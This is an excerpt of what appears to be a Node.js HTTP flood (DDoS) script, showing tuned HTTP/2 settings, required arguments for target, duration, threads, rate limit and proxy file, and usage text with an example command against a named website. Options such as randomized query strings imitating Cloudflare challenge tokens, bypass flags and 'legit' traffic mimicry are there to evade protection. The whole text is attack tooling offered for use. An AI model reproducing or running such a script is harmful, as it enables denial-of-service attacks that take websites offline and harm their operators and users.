...
let custom_table = 655350;        // Increased by 10x
let custom_window = 62914560;     // Increased by 10x
let custom_header = 2621440;      // Increased by 10x
let custom_update = 156631050;    // Increased by 10x
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    ...
    node x.js GET "https://cfcybernews.eu" 120 16 90 https.txt --query 1 --delay 70 --bfm true --full --legit --http mix
    
    https://cfcybernews.eu
    
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
      --delay <1-> - delay between requests 1-100 ms (optimal) default 1 ms
